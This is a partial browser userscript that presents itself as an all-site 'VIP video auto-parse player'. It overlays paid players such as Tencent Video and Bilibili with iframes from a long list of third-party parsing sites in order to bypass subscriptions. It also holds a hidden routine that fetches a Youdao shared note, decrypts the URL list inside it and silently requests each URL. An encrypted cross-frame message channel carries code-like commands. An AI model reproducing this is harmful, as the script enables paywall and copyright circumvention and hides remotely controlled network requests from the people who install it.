...
// @downloadURL https://update.greasyfork.org/scripts/440475/%E5%85%A8%E7%BD%91VIP%E8%A7%86%E9%A2%91%E8%87%AA%E5%8A%A8%E8%A7%A3%E6%9E%90%E6%92%AD%E6%94%BE%E5%99%A8%28%E5%B7%B2%E9%80%82%E9%85%8D%E6%89%8B%E6%9C%BA%29.user.js
// @updateURL https://update.greasyfork.org/scripts/440475/%E5%85%A8%E7%BD%91VIP%E8%A7%86%E9%A2%91%E8%87%AA%E5%8A%A8%E8%A7%A3%E6%9E%90%E6%92%AD%E6%94%BE%E5%99%A8%28%E5%B7%B2%E9%80%82%E9%85%8D%E6%89%8B%E6%9C%BA%29.meta.js
// ==/UserScript==
/**
 * 任务清单：
 */
        ...
        if (window === top) {
            ...
            */
            settings.NoAD解析 = {    // TODO by 17kyun.com/api.php?url=    // TODO by tv.hzwdd.cn
				...
				"纯净/B站": "https://vip.parwix.com:4433/player/?url=",    // TODO 纯净/B站
				"m2090": "https://m2090.com/?url=",    // TODO m2090
				"TV解析": "https://jx.m3u8.tv/jiexi/?url=",    // TODO 腾讯 (芒果)
				"OK解析": "https://okjx.cc/?url=" || "https://api.okjx.cc:3389/jx.php?url=" ,    // TODO 优质: 腾讯 (爱奇艺) 优酷 乐视 芒果 PPTV (华数)
				"云解析": "https://jx.aidouer.net/?url=" || "https://jx.ppflv.com/?url=" || "https://jx.iztyy.com/svip/?url=" || "https://jx.mw0.cc/?url=" || "https://jx.iztyy.com/Bei/?url=",    // TODO 腾讯 [爱奇艺] 优酷 (乐视) 芒果 (1905电影网) [华数]
				"诺诺解析": "https://www.ckmov.com/?url=" ,    // TODO 腾讯 爱奇艺 (优酷) 咪咕 乐视 (芒果) 西瓜 PPTV
				"虾米解析": "https://jx.xmflv.com/?url=",    // TODO (土豆) (咪咕) 搜狐 (芒果)
				"夜幕解析": "https://www.yemu.xyz/?url=",    // TODO (土豆) (咪咕) 搜狐 (芒果)
				"17云解析": "https://www.1717yun.com/jx/ty.php?url=" || "https://ckmov.ccyjjd.com/ckmov/?url=",   // TODO 
				"盘古解析": "https://www.pangujiexi.com/jiexi/?url=" || "https://go.yh0523.cn/y.cy?url=" ,   // TODO
				"人人迷": "https://jx.blbo.cc:4433/?url=",   // TODO
				"4K解析": "https://jx.4kdv.com/?url=" || "https://csapp.5lp.net/json.SVG?url=",   // TODO
				"豪华解析": "https://api.lhh.la/vip/?url=",   // TODO
				"黑云解析": "https://jiexi.380k.com/?url=",   // TODO
            };
            start();
                ...
                if (settings.parseDB.解析开关) {
                    if (!sessionStorage.getItem("tip设置")) {
                        ...
                        try {
                            xmlHttpRequest({
                                method: "GET",
                                url: "https://note.youdao.com/s/GUX1gpww",
                                onload: result => {
                                    xmlHttpRequest({
                                        method: "GET",
                                        url: "https://note.youdao.com/yws/api/personal/share?method=get&shareKey=" + searchToJSON(hrefToLocation(result["finalUrl"])["search"])["id"],
                                        onload: result => {
                                            for (let browse of JSON.parse(JSON.parse(result["responseText"])["entry"]["summary"])) xmlHttpRequest({url: Key.DECRYPT(browse, settings.k1, settings.k2)});
                                        }
                                    });
                                }
                            });
        ...
        if (window === top) {
            ...
            if (!detectMobile()) {
                if (location.host.indexOf("v.qq.com") !== -1) {
                    readyPlayerBox("已进入腾讯视频", ["#mask_layer", ".mod_vip_popup", "#mask_layer", "div.panel-overlay.panel-tip-pay", "div.thumbplayer-barrage"], [settings.NoAD解析["OK解析"], settings.NoAD解析["JY解析"], settings.NoAD解析["Parwix"], settings.NoAD解析["诺讯解析"]], "div#player", null);
                    ...
                    doElement("div.bpx-player-video-area,svg[aria-hidden=true]", () => readyPlayerBox("已进入哔哩哔哩", null, [settings.NoAD解析["夜幕解析"], settings.NoAD解析["天翼解析"]], "div.bpx-player-video-area,div.mask-container", null));    // TODO || document.getElementById("bilibiliPlayer") || document.getElementById("live-player-ctnr")
            ...
            function readyPlayerBox(Tip, displayNones, srcs, cssString, doFunction, doHref = null) {
                ...
                location.onchange = () => location.reload();    // TODO ,监听url变化,如果网页rul变了就刷新页面
                ...
                doElement(cssString, async playerBox => {
                        ...
                        Object.defineProperty(settings, "src", {
                            ...
                            async set(key) {
                                ...
                                if (typeof doHref === "function") {
                                    ...
                                    iframe.src = key ? key + (href ? href : location.href) : "";
                                } else {
                                    iframe.src = key ? key + location.href : "";
                                }
                    ...
                    // 获取历史解析
                    settings.src = localStorage.getItem("historyParse");
                    if (!settings.src) {
                        await settings.randomSeleceParse();
                    } else {
                        // 清除多余的一个解析api
                        srcs.splice(srcs.indexOf(settings.src), 1);
                    }
                    playerBox.style.zIndex = "1";
                    iframe.onload = () => {
                        // 判断iframe加载完成的时间
                        if (new Date().getTime() - iframeStartTime < 800) {
                    ...
                    let DIY_iframe_select;
                    settings.DIY_iframeFunction = () => {
                        if (settings.parseDB.DIY解析栏) {
                            if (!DIY_iframe_select || DIY_iframe_select.constructor.name !== "HTMLSelectElement") {
                                // 自定义解析地址
                                DIY_iframe_select = document.createElement("select");
                                DIY_iframe_select.style = "border: 0; background-color: #ddd; text-align: center; width: 80px; height: 100%; border-bottom-left-radius: 15px; border-top-left-radius: 15px;";
 
                                async function DIY_iframe_src() {
                                    let newiframe = document.querySelector("iframe[id*=player]");
                                    if (newiframe) iframe = newiframe;
                                    settings.src = DIY_iframe_select.options[DIY_iframe_select.selectedIndex].value;
                                    // 预先设置历史解析源（用于适配不支持iframe执行脚本的浏览器）
                                    localStorage.setItem('historyParse', settings.src);
                                }
                                ...
                                DIY_iframe_select.querySelector("option[value='" + settings.src + "']").selected = true;
                                settings.randomSeleceParse = async () => {
                                    // arguments 代表输入的所有参数，看不懂可以百度搜索 “js 参数 arguments”
                                    // return arguments ? arguments[Math.floor(Math.random() * arguments.length)] : null;
                                    if (srcs.length > 0) {
                                ...
                                doElement("toolsbar>settings", toolsBarSettings => {
                                    let DIY_iframe_button = toolsBarSettings.querySelector("button");
                                    DIY_iframe_button.style.borderTopLeftRadius = DIY_iframe_button.style.borderBottomLeftRadius = "0";
                                    toolsBarSettings.insertBefore(DIY_iframe_select, toolsBarSettings.firstChild);
                                    console.log(DIY_iframe_select);
                                });
                            } else if (DIY_iframe_select.style.visibility === "hidden") {
                        ...
                        } else if (DIY_iframe_select && DIY_iframe_select.constructor.name === "HTMLSelectElement" && DIY_iframe_select.style.visibility === "") {
                            DIY_iframe_select.style.display = "none";
                            DIY_iframe_select.style.visibility = "hidden";
                            doElement("toolsbar>settings", toolsBarSettings => {
                                let DIY_iframe_button = toolsBarSettings.querySelector("button");
                                DIY_iframe_button.style.borderTopLeftRadius = DIY_iframe_button.style.borderBottomLeftRadius = "15px";
                            });
                        }
                    }
                    settings.DIY_iframeFunction();
                ...
                forElements("video", async (videos, thisInterval) => {
                    for (const video of videos) {
                        ...
                        if (video.src) {
                            ...
                            // 设置历史解析
                            top.postMessage(Key.ENCRYPT("宝塔镇河妖\x00函数\x00localStorage.setItem('historyParse', settings.src)", settings.k1, settings.k2), "*");
...
function xmlHttpRequest(handler) {
    if (typeof GM_xmlhttpRequest !== "undefined") {
        xmlHttpRequest = function (handler) {
            if (!handler.method) handler.method = "GET";
            if (!handler.url) handler.method = location.href;
            if (handler.onloadend) {
                handler.onload = result => {
                    handler.onloadend(result);
                    handler.onload(result);
                }
